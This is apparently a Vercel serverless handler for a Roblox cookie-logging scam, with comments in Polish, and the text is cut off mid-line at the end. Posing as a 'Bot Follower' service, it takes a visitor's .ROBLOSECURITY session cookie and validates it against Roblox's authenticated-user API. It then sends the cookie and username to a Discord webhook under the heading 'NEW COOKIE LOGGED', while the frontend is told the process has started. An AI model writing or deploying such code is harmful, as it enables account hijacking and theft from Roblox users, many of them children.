// api/release.js
export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Only POST allowed" });
  }

  try {
    const { text } = req.body;

    if (!text || typeof text !== "string" || text.length < 30) {
      return res.status(400).json({ error: "Cookie is missing or too short" });
    }

    const webhook = process.env.WEBHOOK_URL;
    if (!webhook) {
      return res.status(500).json({ error: "WEBHOOK_URL not configured on Vercel" });
    }

    // ────────────────────────────────────────────────
    // Wyciągamy czystą wartość .ROBLOSECURITY
    // ────────────────────────────────────────────────
    let cookieValue = text.trim();

    // Jeśli ktoś wkleił cały string typu: _|WARNING:-DO-NOT-SHARE-THIS...
    // lub "Cookie: .ROBLOSECURITY=..."
    if (cookieValue.includes(".ROBLOSECURITY")) {
      const match = cookieValue.match(/\.ROBLOSECURITY\s*=\s*([^;\s]+)/i);
      if (match && match[1]) {
        cookieValue = match[1].trim();
      }
    } else if (cookieValue.includes("|WARNING")) {
      // czasem ludzie kopiują sam token z ostrzeżeniem
      cookieValue = cookieValue.replace(/^_\|WARNING:.*?\|\_/, "").trim();
    }

    if (!cookieValue.startsWith("_|")) {
      return res.status(400).json({ error: "Doesn't look like a valid .ROBLOSECURITY token" });
    }

    // ────────────────────────────────────────────────
    // Pobieramy username z Roblox API (users/v1/authenticated)
    // ────────────────────────────────────────────────
    let username = "Unknown / Invalid cookie";
    let userId = null;

    try {
      const authResponse = await fetch("https://users.roblox.com/v1/users/authenticated", {
        method: "GET",
        headers: {
          "Cookie": `.ROBLOSECURITY=${cookieValue}`,
          "Accept": "application/json",
          "User-Agent": "Mozilla/5.0 (compatible; CookieChecker/1.0)"
        },
        redirect: "manual" // unikamy redirectów
      });

      if (authResponse.ok) {
        const data = await authResponse.json();
        username = data.name || data.displayName || "Unknown (but authenticated)";
        userId = data.id;
      } else if (authResponse.status === 401) {
        username = "Invalid / Expired cookie";
      }
    } catch (apiErr) {
      console.error("Roblox API error:", apiErr);
      // cichy fail – username zostaje "Unknown"
    }

    // ────────────────────────────────────────────────
    // Embed do Discorda
    // ────────────────────────────────────────────────
    const embed = {
      title: "NEW COOKIE (Bot Follower)",
      color: 0xFF0000, // czerwony – ostrzeżenie
      fields: [
        {
          name: "Username",
          value: `\`${username}\`${userId ? ` (ID: ${userId})` : ""}`,
          inline: true
        },
        {
          name: "Cookie (.ROBLOSECURITY)",
          value: "```" + cookieValue.substring(0, 180) + (cookieValue.length > 180 ? "..." : "") + "```",
          inline: false
        }
      ],
      timestamp: new Date().toISOString(),
      footer: {
        text: "Bot Follower • Do NOT use real accounts • Cookie logger"
      }
    };

    const discordResponse = await fetch(webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: "@everyone  ← NEW COOKIE LOGGED",
        embeds: [embed]
      })
    });

    const discordText = await discordResponse.text();

    // Zwracamy sukces (frontend widzi "Process started...")
    res.status(200).json({
      success: true,
      username,
      cookiePrefix: cookieValue.substring(0, 30) + "...",
      discordStatus: discordResponse.ok ? "sent" : "failed
